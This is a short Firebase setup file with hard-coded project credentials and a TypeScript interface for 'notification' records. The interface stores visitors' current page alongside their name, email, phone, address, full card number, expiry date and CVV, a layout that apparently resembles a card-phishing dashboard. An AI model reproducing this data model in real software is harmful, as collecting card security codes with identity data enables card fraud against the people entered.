import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyDzvPm5f221SyM4aoiCDOUJAwga-F2dm_M",
  authDomain: "asdasdasd-5874a.firebaseapp.com",
  projectId: "asdasdasd-5874a",
  storageBucket: "asdasdasd-5874a.firebasestorage.app",
  messagingSenderId: "335139420841",
  appId: "1:335139420841:web:c5e392c16488e1130647b8",
  measurementId: "G-Q9BH9KFXQL"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

